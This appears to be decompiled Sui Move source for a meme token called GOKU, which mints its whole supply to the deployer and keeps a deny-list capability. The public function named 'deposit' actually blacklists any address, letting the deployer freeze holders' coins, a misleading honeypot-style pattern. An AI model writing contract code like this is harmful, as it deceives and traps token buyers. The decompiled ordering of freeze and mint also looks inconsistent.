module 0xc7587b4f923321ad9e3a760e0d84d96c7d3564b05b2bdaae0ee026e1abec52cc::goku {
    struct GOKU has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GOKU>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GOKU>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: GOKU, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://cdn.dexscreener.com/cms/images/ip2cSw-fnzjQbPr_?width=128&height=128&fit=crop&quality=95&format=auto                                                                                                                                                                                                                    ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<GOKU>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"GOKU    ")))), trim_right(b"Son Goku                        "), trim_right(b"Goku was born as Kakarot on Planet Vegeta. Sent to Earth as an infant to conquer it, a head injury changed his destiny.                                                                                                                                                                                                         "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GOKU>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GOKU>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<GOKU>>(0x2::coin::mint<GOKU>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GOKU>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

